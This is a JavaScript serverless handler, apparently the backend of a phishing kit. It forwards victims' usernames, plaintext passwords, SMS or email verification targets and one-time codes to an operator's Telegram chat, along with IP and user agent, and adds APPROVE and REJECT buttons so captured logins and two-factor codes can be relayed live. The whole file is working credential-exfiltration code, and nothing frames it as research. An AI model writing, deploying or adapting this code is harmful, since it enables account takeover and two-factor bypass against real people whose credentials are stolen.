// api/telegram.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { action, data } = req.body;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.error('Missing Telegram configuration');
    return res.status(500).json({ error: 'Server configuration error' });
  }

  let message = '';
  let sessionId = null;

  // Store session for all actions that need approval
  const pendingApprovals = global.pendingApprovals || new Map();

  switch (action) {
    case 'domain_detection':
      message = formatDomainDetection(data);
      break;
    case 'login_attempt':
      sessionId = data.sessionId;
      message = formatLoginAttempt(data);
      // Store for approval
      pendingApprovals.set(sessionId, { 
        status: 'pending', 
        data: data,
        action: action,
        timestamp: Date.now()
      });
      global.pendingApprovals = pendingApprovals;
      console.log(`💾 Stored login session: ${sessionId}`);
      break;
    case 'auth_attempt':
      sessionId = data.sessionId || 'AUTH_' + Date.now();
      message = formatAuthAttempt(data);
      // Auto-approve auth attempts
      pendingApprovals.set(sessionId, { 
        status: 'approved', 
        data: data,
        action: action,
        timestamp: Date.now()
      });
      global.pendingApprovals = pendingApprovals;
      break;
    case 'code_submitted':
      sessionId = data.sessionId || 'CODE_' + Date.now();
      message = formatCodeSubmitted(data);
      // Store for approval (MANUAL APPROVAL REQUIRED)
      pendingApprovals.set(sessionId, { 
        status: 'pending', 
        data: data,
        action: action,
        timestamp: Date.now()
      });
      global.pendingApprovals = pendingApprovals;
      console.log(`💾 Stored code session: ${sessionId}`);
      break;
    default:
      return res.status(400).json({ error: 'Invalid action' });
  }

  try {
    await sendTelegramMessage(botToken, chatId, message, sessionId);
    res.status(200).json({ success: true, sessionId: sessionId });
  } catch (error) {
    console.error('Telegram send error:', error);
    res.status(500).json({ error: 'Failed to send message' });
  }
}

// ====== FORMAT FUNCTIONS ======

function formatDomainDetection(data) {
  const { domain, isFree, timestamp, userAgent, ip } = data;
  return `
DOMAIN DETECTED
─────────────────
DOMAIN    ${domain}
TYPE      ${isFree ? 'FREE' : 'PURCHASED'}
TIME      ${timestamp}
USER      ${userAgent || 'Unknown'}
IP        ${ip || 'Unknown'}
─────────────────
`;
}

function formatLoginAttempt(data) {
  const { username, password, timestamp, userAgent, ip, sessionId } = data;
  return `
LOGIN ATTEMPT — APPROVAL REQUIRED
─────────────────
USERNAME  ${username}
PASSWORD  ${password}
SESSION   ${sessionId}
TIME      ${timestamp}
USER      ${userAgent || 'Unknown'}
IP        ${ip || 'Unknown'}
─────────────────
ACTION: APPROVE ${sessionId}
        REJECT ${sessionId}
`;
}

function formatAuthAttempt(data) {
  const { method, destination, timestamp, userAgent, ip, sessionId } = data;
  return `
VERIFICATION REQUEST — AUTO-APPROVED
─────────────────
METHOD    ${method === 'sms' ? 'SMS' : 'EMAIL'}
DEST      ${destination}
SESSION   ${sessionId}
TIME      ${timestamp}
USER      ${userAgent || 'Unknown'}
IP        ${ip || 'Unknown'}
─────────────────
`;
}

function formatCodeSubmitted(data) {
  const { code, timestamp, userAgent, ip, sessionId } = data;
  return `
CODE SUBMITTED — APPROVAL REQUIRED
─────────────────
CODE      ${code}
SESSION   ${sessionId}
TIME      ${timestamp}
USER      ${userAgent || 'Unknown'}
IP        ${ip || 'Unknown'}
─────────────────
ACTION: APPROVE ${sessionId}
        REJECT ${sessionId}
`;
}

async function sendTelegramMessage(botToken, chatId, message, sessionId = null) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  let replyMarkup = {};
  if (sessionId) {
    replyMarkup = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'APPROVE', callback_data: `approve_${sessionId}` },
            { text: 'REJECT', callback_data: `reject_${sessionId}` }
          ]
        ]
      }
    };
  }
  
  const payload = {
    chat_id: chatId,
    text: message,
    disable_web_page_preview: true,
    ...replyMarkup
  };

  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  if (!response.ok) {
    const error = await response.text();
    throw new Error(`Telegram API error: ${error}`);
  }

  return response.json();
}